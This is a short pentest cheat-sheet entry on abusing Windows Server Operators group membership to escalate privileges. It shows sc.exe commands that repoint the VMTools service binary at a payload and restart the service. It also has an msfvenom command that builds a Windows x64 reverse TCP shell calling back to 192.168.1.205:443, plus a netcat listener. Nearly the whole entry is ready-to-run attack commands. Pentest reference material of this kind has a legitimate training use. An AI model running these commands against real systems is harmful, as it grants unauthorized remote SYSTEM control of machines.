---
title: Server Operators Group Abuse
category: privesc
subcategory: windows-services
os: windows
command: services
tools: sc, msfvenom
---


Members of `Server Operators` can edit service binaries. Inspect with the `services` console for modifiable services.

### Replace executable on a writable service

```cmd
sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

### Build the reverse shell

```bash
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=443 -f exe > shell.exe
nc -lvnp 443
```
